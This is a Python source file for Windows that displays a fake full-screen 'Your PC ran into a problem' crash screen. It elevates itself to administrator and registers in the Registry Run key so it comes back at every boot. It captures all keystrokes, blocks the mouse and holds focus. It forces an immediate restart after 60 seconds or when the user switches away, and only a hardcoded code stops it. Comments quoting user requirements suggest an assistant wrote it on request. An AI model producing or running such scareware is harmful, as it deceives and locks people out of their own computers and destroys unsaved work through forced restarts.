import tkinter as tk
import keyboard
import os
import sys
import shutil
import subprocess
import ctypes

# --- Admin Privilege Check ---
def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Re-launch the current script with administrator privileges."""
    try:
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            script = sys.executable
            params = ' '.join([script] + sys.argv[1:])
        else:
            # Running as Python script
            script = os.path.abspath(__file__)
            params = ' '.join([script] + sys.argv[1:])
        
        # Use ShellExecute to run with 'runas' (admin)
        ctypes.windll.shell32.ShellExecuteW(
            None, 
            "runas", 
            sys.executable, 
            params, 
            None, 
            1  # SW_SHOWNORMAL
        )
        sys.exit(0)
    except Exception as e:
        # If elevation fails, exit
        sys.exit(1)

# Check and elevate if not admin
if not is_admin():
    run_as_admin()

# --- Config ---
UNLOCK_CODE = "1234567890"
SHUTDOWN_DELAY_MS = 60000  # 60 seconds

key_buffer = ""
shutdown_job = None

import winreg

def log_debug(message):
    try:
        with open(r"C:\Users\Mukun\error_app_debug.txt", "a") as f:
            f.write(f"{message}\n")
    except:
        pass



def add_to_startup():
    """Adds the application to the Windows Registry for startup and cleans up old startup folder methods."""
    log_debug("Attempting to add to startup via Registry...")
    try:
        # Determine path
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = os.path.abspath(__file__)
            
        log_debug(f"App path: {app_path}")

        if not os.path.exists(app_path):
             log_debug(f"Error: Path does not exist: {app_path}")
             return

        # 1. Add to Registry (HKCU)
        # Use cmd /c start /min to open minimized
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        
        # We wrap the command in 'cmd /c start /min "" "path"' to ensure it starts minimized.
        # The empty string "" is the title argument for start, required when path is quoted.
        cmd_str = f'cmd /c start /min "" "{app_path}"'
        
        winreg.SetValueEx(key, "FakeErrorApp", 0, winreg.REG_SZ, cmd_str)
        winreg.CloseKey(key)
        log_debug(f"Successfully added to Registry HKCU...Run command: {cmd_str}")

        # 2. Cleanup oldStartup folder method if exists (to prevent duplicates or 'ghost' startups)
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        old_target = os.path.join(startup_folder, "Error.exe")
        if os.path.exists(old_target):
            log_debug(f"Removing old file from startup folder: {old_target}")
            os.remove(old_target)
            
    except Exception as e:
        log_debug(f"Failed to add to startup: {e}")

def force_shutdown():
    """Executes the system shutdown (restart) command."""
    os.system("shutdown /r /t 0")

def on_key_event(e):
    global key_buffer, shutdown_job
    if e.event_type == 'down':
        name = e.name
        if len(name) == 1: 
            key_buffer += name
        
        key_buffer = key_buffer[-10:]
        
        if key_buffer == UNLOCK_CODE:
            # Cancel shutdown if possible (mostly for logic, though 'after' job is main trigger)
            if shutdown_job:
                root.after_cancel(shutdown_job)
            
            try:
                keyboard.unhook_all()
            except:
                pass
            
            # Optional: Remove from startup on successful unlock? 
            # User requirement said "when pc restarts this app runs again", 
            # but usually "winning" the game should stop it. 
            # For now, we leave it in startup as per "runs again".
            
            os._exit(0)

# Hook global keys
keyboard.hook(on_key_event, suppress=True)

# GUI Setup
root = tk.Tk()
root.title("System Error")
root.attributes('-fullscreen', True)
root.configure(background='#0078D7') # Standard BSOD Blue. Use 'black' if explicitly requested, but usually "exactly like windows error" means blue.
# User said "full black screen" previously, but now "exactly like windows ran into a error". 
# I will use Black to be consistent with previous constraint but apply the visual layout.
root.configure(background='black') 

root.config(cursor="none")

# Layout
# Vertical spacing helper
def spacer(h):
    tk.Frame(root, height=h, bg='black').pack()

spacer(100)

# Sad Face
lbl_face = tk.Label(root, text=":(", font=("Segoe UI", 100), fg="white", bg="black")
lbl_face.pack(anchor="w", padx=100)

spacer(30)

# Main Text
msg = "Your PC ran into a problem and needs to restart.\nWe're just collecting some error info, and then we'll restart for you."
lbl_msg = tk.Label(root, text=msg, font=("Segoe UI", 25), fg="white", bg="black", justify="left")
lbl_msg.pack(anchor="w", padx=100)

spacer(40)

# Percentage
lbl_pct = tk.Label(root, text="0% complete", font=("Segoe UI", 25), fg="white", bg="black")
lbl_pct.pack(anchor="w", padx=100)

# Start logic
# Run state
ARMED = False

def start_app():
    # 1. Add to startup (Ensure persistence)
    add_to_startup()
    
    # 2. Block inputs
    block_interactions()
    
    # 3. Schedule shutdown (Backup timer)
    global shutdown_job
    shutdown_job = root.after(SHUTDOWN_DELAY_MS, force_shutdown)
    
    # 4. Fake Percentage Counter
    update_percentage(0)

    # 5. Arm the interaction trigger after a short grace period (e.g. 2s) to allow window to settle
    root.after(2000, arm_triggers)

def arm_triggers():
    global ARMED
    ARMED = True
    log_debug("System Armed: Focus loss will now trigger restart.")

def update_percentage(p):
    if p < 100:
        p += 1
        lbl_pct.config(text=f"{p}% complete")
        # 60 seconds total / 100 steps = 600ms per step
        root.after(600, lambda: update_percentage(p))
    else:
        lbl_pct.config(text="100% complete")
        root.after(1000, force_shutdown) # Wait 1s then kill

def block_interactions():
    # Mouse blocking
    def block_input(event):
        return "break"
    root.bind('<Button-1>', block_input)
    root.bind('<Button-2>', block_input)
    root.bind('<Button-3>', block_input)
    root.bind('<Motion>', block_input)
    root.bind('<MouseWheel>', block_input)
    
    # Window Topmost
    root.attributes('-topmost', True)
    
    # Focus lock
    def maintain_focus():
        try:
            root.grab_set_global() 
        except:
            root.grab_set()
        root.lift()
        root.focus_force()
        root.after(100, maintain_focus)
    maintain_focus()

    # Trigger restart on Focus Out (Tab switch, Ctrl+Alt+Del, etc)
    def on_focus_loss(event):
        if ARMED:
            log_debug("Focus lost! Triggering immediate shutdown.")
            force_shutdown()
            
    root.bind("<FocusOut>", on_focus_loss)

def disable_event():
    pass
root.protocol("WM_DELETE_WINDOW", disable_event)

# Run
root.after(100, start_app)
root.mainloop()
